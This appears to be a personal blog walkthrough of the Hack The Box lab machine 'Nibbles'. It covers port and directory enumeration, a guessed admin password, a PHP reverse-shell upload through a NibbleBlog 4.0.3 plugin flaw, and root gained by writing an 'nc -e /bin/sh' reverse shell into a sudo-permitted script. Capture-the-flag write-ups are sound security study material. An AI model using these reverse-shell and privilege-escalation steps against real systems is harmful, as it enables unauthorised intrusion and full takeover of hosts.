---
title: "HTB - Nibbles without MetaSploit"
date: 2021-02-17
categories: ["hacking", "write-ups"]
tags: [HTB]
featuredImage: "/images/2021/02/Nibbles_Logo.png"
---
## Intro
Easy box, according to HTB notation, also not a very good user's rating. Let's see what it is about!

## Target
[HTB - Nibbles](https://app.hackthebox.eu/machines/121)

## Recon
Quick recon according to logo and info :

* Linux box ;
* Misc : web, misconfiguration.

## Enum

Classic `nmap` scan :

```text
sudo nmap -T4 -A -p- -oA scan $target_ip
```
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 16:42 CET
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=31405%PV=Y%DS=2%DC=T%G=Y%TM=602D399
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   23.69 ms 10.10.14.1
2   24.01 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
```

### Web scanning
Let's enumerate web folders in CLI, for a change :

```text
gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

```
This won't give us much information, however by browsing to the website and checking its source we find a new URL :

![Nibbles Check Source](/images/2021/02/Nibbles_Check_Source.png)

We fire `gobuster` one more time, with this new URL :

```text
gobuster dir -u http://$target_ip/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

```
```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$target_ip/nibbleblog/
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/17 16:54:47 Starting gobuster
===============================================================
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/languages (Status: 301)
/index.php (Status: 200)
/content (Status: 301)
/sitemap.php (Status: 200)
===============================================================
2021/02/17 16:55:21 Finished
===============================================================p
```
It will reveal juicier info, such as `admin.php`, `install.php`, `sitemap`, etc.

Going to `install.php` will tell us the site is already installed and propose to upgrade it which will eventually leak `NibbleBlog version 4.0.3` :

![Nibbles Version](/images/2021/02/Nibbles_Version.png)

By checking source code on Github, we also find juicy directory in `/content/private` :

![Nibbles Directory Listing](/images/2021/02/Nibbles_Dir_List.png)

Now checking `searchsploit` we find that our version is vulnerable to [Authenticated Arbitrary File Upload](https://www.exploit-db.com/exploits/38489). It means we need to get the credentials. 

By looking inside the users.xml file we can suppose that `admin` is the login. 

## Exploitation

Now, we could try to brute force the admin area, however it won't be effective since Nibbleblog will temporarily block our IP after a few attempts:

![Nibbles WAF](/images/2021/02/Nibbles_WAF.png)

Here, again, I spent way more time than I care to admit. You have to find the password, but can't "crack" it which means we have to guess it. I tried a lot of stuff... but couldn't find it, so I cheated... again!

We know the password is `admin`, and the password is `nibbles`, like the box's name (which I tried), but I uesd a capital `N`.

![Nibbles Admin Area](/images/2021/02/Nibbles_Admin_Area.png)

Now that we have our credentials, we can finally start playing with the CVE we found earlier! Since, we are trying to solve this without MetaSploit, we need to find a [manual way](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) to exploit our target.

### Getting initial shell
Let's create a [php shell(https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)], thanks to Pentest Monkey and upload it via the Image plugin located at `http://$target_ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`, then we will run shell my going to this URL : `http://$target_ip/nibbleblog/content/private/plugins/my_image/image.php`. The filename will always be `image.ext` with `ext` being the "real" extension.

NB : do not forget to start your listener : `nc -nlvp 1234`.

And we are in, unfortunately as `nibbler` and not `root` :

![Nibbles Initial Shell](/images/2021/02/Nibbles_Initial_Shell.png)

Let's still grab the user flag :

![Nibbles User Flag](/images/2021/02/Nibbles_User_Flag.png)

And now... we need to escalate our priv!

### PrivEsc

Before we can have a chance to elevate our privs, we should do more [internal recon](https://www.masoopy.com/cheatsheets/got-shell/).

We'll upload [LSE](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh), in order to check for any "entry points" to privileges escalation.

We will serve our script via `sudo python2 -m SimpleHTTPServer 80` since our target doesn't seem to resolve Github's domain's and download it with `curl`.

Once it downloaded, give it exec right, then run it. Something interesting will come up :

![Nibbles LSE Sudo](/images/2021/02/Nibbles_LSE_Sudo.png)

This means that we'll be able to run anything as `root` as long as it is in `/home/nibbler/personal/stuff/monitor.sh`.

All right! Let's try to run a reverse shell :

```text
cd /home/nibbler
echo "#!/bin/bash" > personal/stuff/monitor.sh
echo "nc -e "/bin/sh" $attacking_ip 1235" >> personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
```

Now we run it :

`sudo /home/nibbler/personal/stuff/monitor.sh`

NB : don't forget to start the listener on your attacking machine.

And that's it, we have root :

![Nibbles Root Shell](/images/2021/02/Nibbles_Root_Shell.png)

And we grab the last flag  :

![Nibbles Root Flag](/images/2021/02/Nibbles_Root_Flag.png)

## Outro

Let me be blunt. Getting the admin's password sucked, and was no fun at all. By judging from the comments on the forum and the poor notation, I guess I wasn't the only one really frustrated while trying to get initial access. However, once I was in, while it was pretty easy, it was also super fun and really enjoyed this box!